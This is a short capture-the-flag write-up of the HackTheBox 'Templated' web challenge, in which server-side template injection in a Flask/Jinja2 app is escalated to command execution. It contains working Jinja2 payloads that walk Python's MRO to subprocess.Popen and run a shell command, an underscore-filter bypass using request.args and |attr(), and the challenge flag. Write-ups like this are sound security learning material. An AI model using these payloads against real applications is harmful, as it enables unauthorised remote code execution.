---
title: "HackTheBox — Templated (SSTI → RCE)"
description: "Server-side template injection in a Flask/Jinja2 app. Bypassed basic filters using attribute access chains to achieve remote code execution and read the root flag."
platform: "HackTheBox"
category: "Web"
difficulty: "Easy"
date: 2026-02-14
---

## Challenge Info

**Platform:** HackTheBox
**Category:** Web
**Difficulty:** Easy
**Points:** 20

## Recon

The application reflected user input from the URL path directly into the page. Testing with a simple Jinja2 expression quickly confirmed SSTI:

```
GET /{{ 7*7 }} HTTP/1.1

Response: ...49...
```

## Exploitation

With confirmed SSTI in Jinja2, the goal is to reach `os.popen()` through Python's MRO chain.

```python
# Basic payload — bypass attribute filter
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Find subprocess.Popen index, then:
{{ ''.__class__.__mro__[1].__subclasses__()[OFFSET]('cat /flag.txt', shell=True, stdout=-1).communicate() }}
```

## Filter Bypass

The app filtered underscores (`_`). I used `request.args` to pass the payload as a GET parameter:

```
GET /{{request.args.x|attr(request.args.y)}}?x=__class__&y=__mro__ HTTP/1.1
```

## Flag

```
HTB{t3mpl4t3_1nj3ct10n_1s_s3rv3r_s1d3}
```

## Lessons

- SSTI in Jinja2 is reliably exploitable via MRO traversal
- Simple character filters are bypassable with `request.args` or `|attr()`
- Always check if reflected content is in a template context, not just HTML context
